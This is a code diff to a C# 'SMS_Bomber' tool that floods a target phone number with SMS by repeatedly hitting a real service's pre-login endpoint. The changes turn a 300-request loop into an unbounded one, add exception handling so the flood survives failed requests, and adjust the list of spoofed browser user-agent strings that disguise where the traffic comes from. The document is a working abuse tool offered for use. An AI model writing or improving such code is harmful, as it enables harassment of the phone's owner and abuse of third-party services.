@@ -27,8 +27,11 @@ namespace SMS_Bomber
                 return;
             }
 
-            for (int i = 0; i < 300; i++)
+            for (; ; )
             {
+                if (Console.KeyAvailable)
+                    break;
+
                 Task[] requests = new Task[]
                 {
 				    SendRequestAsync("https://pizzaday.eatery.club/site/v1/pre-login", HttpMethod.Post, $"{{\"phone\": \"{phone}\"}}", "application/json", new Dictionary<string, string>
@@ -282,10 +285,17 @@ namespace SMS_Bomber
                     httpRequest.Headers.Add(header.Key, header.Value);
                 }
 
-                HttpResponseMessage httpResponse = await httpClient.SendAsync(httpRequest);
-                string content = await httpResponse.Content.ReadAsStringAsync();
+                try
+                {
+                    HttpResponseMessage httpResponse = await httpClient.SendAsync(httpRequest);
+                    string content = await httpResponse.Content.ReadAsStringAsync();
 
-                Console.WriteLine($"[{DateTime.Now.ToString("HH:mm:ss")}] {httpRequest.RequestUri.Host}: {httpResponse.StatusCode}");
+                    Console.WriteLine($"[{DateTime.Now.ToString("HH:mm:ss")}] {httpRequest.RequestUri.Host}: {httpResponse.StatusCode}");
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine($"[{DateTime.Now.ToString("HH:mm:ss")}] Error: {e.Message}");
+                }
             }
         }
 
@@ -517,7 +527,6 @@ namespace SMS_Bomber
                 "Mozilla/5.0 (X11; CrOS i686 12.433.216) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.105 Safari/534.30",
                 "Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
                 "Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100",
-                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Slackware/Chrome/12.0.742.100 Safari/534.30",
                 "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
                 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
                 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
